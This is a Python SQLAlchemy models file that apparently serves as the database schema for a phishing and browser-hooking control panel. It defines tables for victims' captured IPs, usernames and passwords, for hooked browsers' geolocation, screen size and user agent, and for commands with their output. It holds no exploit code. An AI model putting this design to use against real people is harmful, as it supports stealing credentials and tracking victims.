from sqlalchemy import Column, String, Integer, Text, ForeignKey
from sqlalchemy.ext.declarative import declarative_base

Base = declarative_base()

class Users(Base):
    __tablename__ = 'USERS'
    email = Column(String(50), primary_key=True)
    password = Column(String(20))

    def __init__(self, email, password):
        self.email = email
        self.password = password

    def __repr__(self):
        return f"[{self.email}, {self.password}]"

class APICommand(Base):
    __tablename__ = 'API_COMMAND'
    email = Column(String(20), ForeignKey('USERS.email'), primary_key=True)
    cmd = Column(String(20))
    output = Column(Text)
    condition = Column(Text)

    def __init__(self, email, cmd, output, condition):
        self.email = email
        self.cmd = cmd
        self.output = output
        self.condition = condition

    def __repr__(self):
        return f"[{self.email}, {self.cmd}, {self.output}, {self.condition}]"

class APILink(Base):
    __tablename__ = 'API_LINK'
    email = Column(String(20), ForeignKey('USERS.email'), primary_key=True)
    link = Column(String(20))
    action_type = Column(Text)
    condition = Column(Text)

    def __init__(self, email, link, action_type, condition):
        self.email = email
        self.link = link
        self.action_type = action_type
        self.condition = condition

    def __repr__(self):
        return f"[{self.email}, {self.link}, {self.action_type}, {self.condition}]"

class Fishing(Base):
    __tablename__ = 'FISHING'
    email = Column(String(20), ForeignKey('USERS.email'), primary_key=True)
    ip = Column(String(50))
    username = Column(String(50))
    password = Column(String(20))

    def __init__(self, email, ip, username, password):
        self.email = email
        self.ip = ip
        self.username = username
        self.password = password

    def __repr__(self):
        return f"[{self.email}, {self.ip}, {self.username}, {self.password}]"

class Hooking(Base):
    __tablename__ = 'HOOKING'
    email = Column(String(20), ForeignKey('USERS.email'), primary_key=True)
    ip = Column(String(20))
    lon = Column(Integer)
    lat = Column(Integer)
    screen_h = Column(Integer)
    screen_w = Column(Integer)
    app_name = Column(Text)
    app_code_name = Column(String(20))
    product_name = Column(String(50))
    user_agent = Column(Text)
    platform = Column(String(50))

    def __init__(self, email, ip, lon, lat, screen_h, screen_w, app_name, app_code_name, product_name, user_agent, platform):
        self.email = email
        self.ip = ip
        self.lon = lon
        self.lat = lat
        self.screen_h = screen_h
        self.screen_w = screen_w
        self.app_name = app_name
        self.app_code_name = app_code_name
        self.product_name = product_name
        self.user_agent = user_agent
        self.platform = platform

    def __repr__(self):
        return f"[{self.email}, {self.ip}, {self.lon}, {self.lat}, {self.screen_h}, {self.screen_w}, {self.app_name}, {self.app_code_name}, {self.product_name}, {self.user_agent}, {self.platform}]"
